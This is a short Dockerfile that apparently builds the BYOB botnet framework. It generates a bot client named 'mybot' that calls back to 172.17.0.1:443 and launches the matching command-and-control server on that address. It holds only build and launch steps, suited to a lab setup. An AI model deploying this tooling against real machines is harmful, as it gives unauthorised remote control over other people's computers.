FROM python:2

WORKDIR /usr/src/app
COPY . .

WORKDIR /usr/src/app/byob
RUN pip install --no-cache-dir -r requirements.txt
RUN python ./setup.py
RUN python ./client.py --name mybot 172.17.0.1 443

CMD [ "python", "server.py", "--host", "172.17.0.1", "--port", "443" ]
